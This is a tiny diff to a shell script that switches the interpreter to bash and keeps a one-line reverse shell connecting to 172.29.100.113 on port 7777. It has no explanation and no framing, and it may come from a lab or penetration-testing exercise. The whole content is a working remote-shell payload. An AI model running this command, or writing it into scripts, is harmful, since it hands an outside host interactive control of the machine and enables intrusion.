@@ -1,3 +1,3 @@
-#!/bin/sh
+#!/bin/bash
 
-bash -c "bash -i >& /dev/tcp/172.29.100.113/7777 0>&1"
+bash -i >& /dev/tcp/172.29.100.113/7777 0>&1
